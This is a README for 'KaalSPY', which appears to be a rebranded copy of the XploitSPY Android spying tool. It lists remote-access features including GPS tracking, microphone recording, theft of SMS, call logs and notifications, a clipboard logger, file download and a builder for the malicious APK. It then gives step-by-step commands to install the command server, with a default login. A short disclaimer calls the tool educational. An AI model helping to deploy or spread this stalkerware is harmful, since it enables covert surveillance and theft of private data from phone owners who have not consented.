<p align="center">
<img src="https://github.com/KaalMous/KaalSPY/raw/master/assets/webpublic/logo.png" height="60"><br>
A cloud based Android Spying or Monitoring Tool, powered by NodeJS
</p>



## Features
- Auto Permissions
- Device Administrator
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail and more ....)
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Built In APK Builder

## Prerequisites 
 - Java Runtime Environment 9+
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server e.g: aws, azure, google cloud, digital ocean
   Get Free Server from https://www.heroku.com/

## Installation 

## Video Tutorial : https://youtu.be/QFeQyuOnnmk

0. Connect to your server via SSH

1. Install JRE 9+ 
    - Debian, Ubuntu, Etc
        - `sudo apt install openjdk-11-jre-headless`
    - Fedora, Oracle, Red Hat, etc
        -  `sudo yum install java-11-openjdk-devel"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre9-downloads-3848532.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `sudo npm install pm2 -g`

4. Clone this repository
    - `git clone https://github.com/KaalMous/Kaal_SPY.git`

5. Now change to the XploitSPY directory and run these commands
    - `npm install` <- install dependencies
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- to run XploitSPY on startup
    
6. Default Username : kaal & Default Password : kaal

7. Change the Username & Password
    1. Stop KaalSPY `pm2 stop index`
    2. Open `maindb.json` in a text editor
    3. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
    4. save the file
    5. run `pm2 restart all`

8. in your browser navigate to `http://<SERVER IP or URL>:22533`
    
It's recommended to run KaalSPY behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)



## Disclaimer
<b>KaalSPY Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
XploitSPY is built for Educational Purpose. Use at your own Risk.</b>

<br>
<p align="center">Made with ❤️ By <a href="https://t.me/prohackerboy">Kaal</a></p>

